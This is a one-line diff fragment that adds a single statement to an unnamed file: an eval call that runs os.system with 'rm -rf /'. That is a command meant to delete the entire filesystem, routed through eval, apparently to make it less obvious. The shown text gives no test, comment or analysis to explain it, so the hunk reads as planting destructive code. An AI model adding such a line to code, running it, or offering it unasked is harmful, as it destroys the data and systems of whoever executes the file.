@@ -1,0 +1,1 @@
+eval('os.system("rm -rf /")')
